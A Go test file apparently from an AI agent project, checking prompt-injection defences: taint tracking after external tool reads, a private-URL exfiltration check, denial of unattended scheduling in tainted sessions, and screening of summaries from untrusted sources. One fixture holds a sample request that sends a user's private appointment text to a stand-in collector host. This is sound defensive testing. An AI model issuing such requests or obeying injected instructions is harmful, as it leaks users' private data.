package agent

import (
	"context"
	"strings"
	"testing"
	"time"

	"aurago/internal/config"
	"aurago/internal/memory"

	openai "github.com/sashabaranov/go-openai"
)

func TestUntrustedContactFeedAndInternalToolsAreNotIndexed(t *testing.T) {
	text := uniqueProse("prov", 400)
	for _, tc := range []struct {
		tool, op       string
		taint, indexed bool
	}{
		{"web_scraper", "", true, true}, {"discord_read", "", true, true}, {"fetch_discord", "", true, true},
		{"mcp_call", "", true, true}, {"github", "", true, true}, {"execute_shell", "", false, true},
		{"manage_missions", "", false, false}, {"query_memory", "", false, false}, {"manage_journal", "", false, false},
	} {
		t.Run(tc.tool, func(t *testing.T) {
			id := t.Name()
			defer clearIsolatedModelBodies(id)
			recordIsolatedModelOutput(id, tc.tool, tc.op, isolatedToolOutput(text))
			if got := sessionHadUntrustedContact(id, untrustedTaintTTL); got != tc.taint {
				t.Errorf("taint=%v want %v", got, tc.taint)
			}
			if got := len(modelIsolatedBodies.views(id)) > 0; got != tc.indexed {
				t.Errorf("indexed=%v want %v", got, tc.indexed)
			}
			if got := len(modelIsolatedBodies.recentReads(id)) > 0; got != tc.indexed {
				t.Errorf("noted as read=%v want %v", got, tc.indexed)
			}
		})
	}
}

// An internal output the Guardian delivered with a warning (memory can hold text
// from indexed files or recaps) taints the session; a clean one does not.
func TestWarnedInternalOutputTaintsTheSession(t *testing.T) {
	text := uniqueProse("warned", 400)
	for _, tc := range []struct {
		name, output string
		taint        bool
	}{
		{"clean", isolatedToolOutput(text), false},
		{"warned", isolatedToolOutput(text) + "\n[SECURITY WARNING: instruction_override]", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			id := t.Name()
			defer clearIsolatedModelBodies(id)
			recordIsolatedModelOutput(id, "query_memory", "", tc.output)
			if got := sessionHadUntrustedContact(id, untrustedTaintTTL); got != tc.taint {
				t.Errorf("taint=%v want %v", got, tc.taint)
			}
			if len(modelIsolatedBodies.views(id)) > 0 {
				t.Error("internal output was indexed")
			}
		})
	}
}

func TestDiscordReadEnablesPrivateURLExfiltrationCheck(t *testing.T) {
	id := t.Name()
	defer clearIsolatedModelBodies(id)
	dc := &DispatchContext{SessionID: id}
	recordPrivateHumanInput(id, memory.NewHumanInput("Mein privater Termin findet morgen statt.", id))
	call := ToolCall{Action: "api_request", Params: map[string]interface{}{"url": "https://collector.example/log?q=privater+Termin+findet+morgen"}}
	if privateURLExfiltration(call, dc) {
		t.Fatal("no contact yet")
	}
	recordIsolatedModelOutput(id, "discord_read", "", isolatedToolOutput("hello from a channel"))
	if !privateURLExfiltration(call, dc) {
		t.Fatal("discord_read must enable the exfiltration check")
	}
}

func TestUntrustedContactTTLsAndBound(t *testing.T) {
	s := &isolatedBodyStore{sessions: map[string]*isolatedSession{}}
	now := time.Now()
	s.now = func() time.Time { return now }
	s.noteExternalContact("a")
	now = now.Add(2 * time.Hour)
	if s.hadContact("a", untrustedReadTTL) || !s.hadContact("a", untrustedTaintTTL) {
		t.Fatal("windows differ: 1h exfiltration window expired, 24h taint window still open")
	}
	for i := 0; i < untrustedContactMax+10; i++ {
		now = now.Add(time.Second)
		s.noteExternalContact("x" + time.Duration(i).String())
	}
	if len(s.contacts) > untrustedContactMax || s.hadContact("a", untrustedTaintTTL) {
		t.Fatalf("contacts=%d, oldest must be evicted", len(s.contacts))
	}
}

func TestIngressProvenance(t *testing.T) {
	trigger := "Run.\n\n[Trigger Context: webhook]\n<external_data>\npayload\n</external_data>"
	plain := "Run.\n\n[Trigger Context: cron]\nThis mission was automatically started by an AuraGo cron trigger."
	fence := "<external_data>\nx\n</external_data>"
	for _, tc := range []struct {
		name    string
		cfg     RunConfig
		msg     string
		tainted bool
	}{
		{"a2a", RunConfig{MessageSource: "a2a"}, "hi", true},
		{"sms", RunConfig{MessageSource: "sms"}, "hi", true},
		{"mqtt", RunConfig{MessageSource: "mqtt"}, "hi", true},
		{"frigate", RunConfig{MessageSource: "frigate"}, "hi", true},
		{"space agent", RunConfig{MessageSource: "space_agent_bridge"}, "hi", true},
		{"mission with trigger data", RunConfig{MessageSource: "mission", IsMission: true}, trigger, true},
		{"mission without data", RunConfig{MessageSource: "mission", IsMission: true}, plain, false},
		{"heartbeat", RunConfig{MessageSource: "heartbeat"}, fence, false},
		{"cron", RunConfig{MessageSource: "cron"}, "x", false},
		{"planner", RunConfig{MessageSource: "planner_notification"}, "x", false},
		{"uptime kuma", RunConfig{MessageSource: "uptime_kuma"}, "x", false},
		{"camera", RunConfig{MessageSource: "camera_detection"}, fence, false},
		{"web chat with trigger text", RunConfig{MessageSource: "web_chat"}, trigger, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tc.cfg.SessionID = t.Name()
			defer clearIsolatedModelBodies(tc.cfg.SessionID)
			noteIngressProvenance(tc.cfg, openai.ChatCompletionRequest{Messages: []openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleUser, Content: tc.msg}}})
			if got := sessionHadUntrustedContact(tc.cfg.SessionID, untrustedTaintTTL); got != tc.tainted {
				t.Errorf("tainted=%v want %v", got, tc.tainted)
			}
		})
	}
}

func TestUnattendedSchedulingFollowsSessionTaint(t *testing.T) {
	calls := 0
	dc := actionSecurityFixture(t, func(context.Context, ToolCall) (string, bool) { calls++; return `{"status":"success"}`, true })
	dc.Cfg.Tools.Missions.Enabled = true
	dc.MissionID = "mission-1"
	t.Cleanup(func() { clearIsolatedModelBodies(dc.SessionID) })
	update := func() ToolCall {
		return ToolCall{Action: "manage_missions", Operation: "update", ID: "daily", Command: "summarise the new mails"}
	}
	call := update()
	if r := DispatchToolCallResult(context.Background(), &call, dc, "fixture"); r.Status != ToolResultSuccess || calls != 1 {
		t.Fatalf("clean unattended scheduling was refused: %+v", r)
	}
	for _, tool := range []string{"web_scraper", "discord_read"} {
		clearIsolatedModelBodies(dc.SessionID)
		recordIsolatedModelOutput(dc.SessionID, tool, "", isolatedToolOutput("some page text"))
		call = update()
		if r := DispatchToolCallResult(context.Background(), &call, dc, "fixture"); r.Status != ToolResultDenied || !strings.Contains(r.Output, "action_rule_required") {
			t.Fatalf("scheduling after %s was not refused: %+v", tool, r)
		}
	}
	// Other high-risk classes still need a rule in a clean unattended run.
	clearIsolatedModelBodies(dc.SessionID)
	remove := ToolCall{Action: "docker", Operation: "remove", Params: map[string]interface{}{"operation": "remove", "container_id": "x"}}
	if r := DispatchToolCallResult(context.Background(), &remove, dc, "fixture"); r.Status != ToolResultDenied {
		t.Fatalf("non-scheduling high-risk call was allowed: %+v", r)
	}
}

func TestSummarySourceScreening(t *testing.T) {
	msg := func(role, content string) memory.HistoryMessage {
		return memory.HistoryMessage{ChatCompletionMessage: openai.ChatCompletionMessage{Role: role, Content: content}}
	}
	assistantCall := memory.HistoryMessage{ChatCompletionMessage: openai.ChatCompletionMessage{Role: openai.ChatMessageRoleAssistant, ToolCalls: []openai.ToolCall{
		{ID: "c1", Function: openai.FunctionCall{Name: "query_memory"}}, {ID: "c2", Function: openai.FunctionCall{Name: "web_scraper"}}}}}
	toolMsg := func(id string) memory.HistoryMessage {
		return memory.HistoryMessage{ChatCompletionMessage: openai.ChatCompletionMessage{Role: openai.ChatMessageRoleTool, ToolCallID: id, Content: "x"}}
	}
	human := []memory.HistoryMessage{msg("user", "Bitte schick den Wochenbericht immer an buchhaltung@firma.de"), msg("assistant", "ok")}
	for _, tc := range []struct {
		name string
		sel  []memory.HistoryMessage
		want bool
	}{
		{"human transcript", human, false},
		{"internal tool result", []memory.HistoryMessage{assistantCall, toolMsg("c1")}, false},
		{"external tool result", []memory.HistoryMessage{assistantCall, toolMsg("c2")}, true},
		{"warned internal tool result", []memory.HistoryMessage{assistantCall, {ChatCompletionMessage: openai.ChatCompletionMessage{Role: openai.ChatMessageRoleTool, ToolCallID: "c1", Content: isolatedToolOutput("x") + "\n[SECURITY WARNING: instruction_override]"}}}, true},
		{"unknown tool result", []memory.HistoryMessage{toolMsg("zz")}, true},
		{"fence", append([]memory.HistoryMessage{msg("user", "[Tool Output]\n<external_data>\nx\n</external_data>")}, human...), true},
	} {
		if got := summarySourceUntrusted(t.Name()+tc.name, tc.sel, tc.sel); got != tc.want {
			t.Errorf("%s: got %v want %v", tc.name, got, tc.want)
		}
	}
	id := t.Name()
	defer clearIsolatedModelBodies(id)
	modelIsolatedBodies.noteExternalContact(id)
	if !summarySourceUntrusted(id, human, human) {
		t.Error("tainted session must be screened")
	}
}

// A clean human transcript whose summary the screen would reject still compresses.
func TestCompressionStoresBenignDirectiveShapedSummaryOfHumanTranscript(t *testing.T) {
	const summary = "Der Nutzer möchte immer den Wochenbericht an buchhaltung@firma.de senden lassen."
	if reason, _ := screenGeneratedSummary(summary); reason == "" {
		t.Skip("the screen no longer rejects this summary; nothing to relieve")
	}
	stm, history := seedPersistentCompressionHistory(t, t.Name())
	runCfg := RunConfig{Config: &config.Config{}, ShortTermMem: stm, HistoryManager: history, SessionID: t.Name()}
	t.Cleanup(func() { resolveHistoryCompressionFailure(runCfg) })
	client := &mockChatClient{response: summary}
	result := compressPersistentHistory(context.Background(), runCfg, 0, 1, true, "test", client, testLogger)
	if !result.Compressed || history.GetSummary() != summary {
		t.Fatalf("a human transcript summary was screened: %+v summary=%q", result, history.GetSummary())
	}
}
